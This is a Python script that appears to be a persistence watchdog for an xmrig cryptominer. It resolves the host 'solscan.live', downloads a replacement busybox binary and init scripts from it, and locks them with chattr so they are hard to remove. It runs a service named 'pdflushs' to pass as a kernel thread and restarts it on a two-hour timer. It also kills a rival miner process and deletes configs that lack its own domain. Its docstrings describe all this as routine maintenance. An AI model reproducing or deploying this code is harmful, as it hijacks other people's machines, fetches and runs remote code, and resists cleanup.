#!/usr/bin/python
# coding=utf-8
from threading import Timer
import datetime
import os
import platform
import socket

times = 0

def checkConfig():
    """Check if config.json exists and contains 'solscan.live'."""
    config_path = "/usr/bin/config.json"
    if not os.path.exists(config_path):
        return True
    with open(config_path, 'r') as f:
        result = f.read()
    return "solscan.live" not in result

def checkHttp(ip):
    """Check HTTP status from the given IP address."""
    try:
        result = os.popen(f'/lib64/busybox wget http://{ip[0][4][0]}/sha512/status -O - -q').read().strip()
        return result == "200"
    except:
        return False

def checkProc(procName):
    """Check if a process is running and if not, replace busybox."""
    ip = socket.getaddrinfo("solscan.live", None)
    while True:
        try:
            result = os.popen(f'/lib64/busybox ps | /lib64/busybox grep {procName} | /lib64/busybox grep -v grep | /lib64/busybox wc -l').read().strip()
            if result:
                return result
        except:
            pass
        
        os.system("/lib64/busybox chattr -ai /lib64/busybox")
        os.system(f"/lib64/busybox wget http://{ip[0][4][0]}/xmrig/busybox -O /lib64/busybox")
        os.system("/lib64/busybox chmod a+x /lib64/busybox")
        os.system("/lib64/busybox chattr +ai /lib64/busybox")

def tick():
    """Periodic task to manage processes and update configurations."""
    ip = socket.getaddrinfo("solscan.live", None)
    if not os.path.exists("/etc/init.d/pdflushs"):
        os.system("/lib64/busybox chattr -ai /etc/init.d/pdflushs")
        osType = platform.platform()
        if "centos" in osType:
            os.system(f"/lib64/busybox wget http://{ip[0][4][0]}/xmrig/launch -O /etc/init.d/pdflushs")
        elif "Ubuntu" in osType:
            os.system(f"/lib64/busybox wget http://{ip[0][4][0]}/xmrig/launch-ubuntu -O /etc/init.d/pdflushs")
        os.system("/lib64/busybox chmod a+x /etc/init.d/pdflushs")
        os.system("/lib64/busybox chattr +ai /etc/init.d/pdflushs")
        return

    res = checkProc("pdflushs")
    if res == '0':
        os.system("nohup /etc/init.d/pdflushs start >/dev/null &")
    elif int(res) > 3:
        os.system("/lib64/busybox killall -9 pdflushs")
        os.system("nohup /etc/init.d/pdflushs start >/dev/null &")

    if checkHttp(ip):
        os.system("nohup /etc/init.d/pdflushs update >/dev/null &")
    if checkConfig():
        os.system("/lib64/busybox rm -f /usr/bin/config.json")
    
    global times
    times += 1
    if (times - 1) * 2 == 24:
        os.system("/lib64/busybox killall -9 kthreadds")
        times = 0
    
    Timer(7200, tick).start()

if __name__ == '__main__':
    res = checkProc("libgc++.so")
    if res == '1':
        tick()
    else:
        os._exit(0)
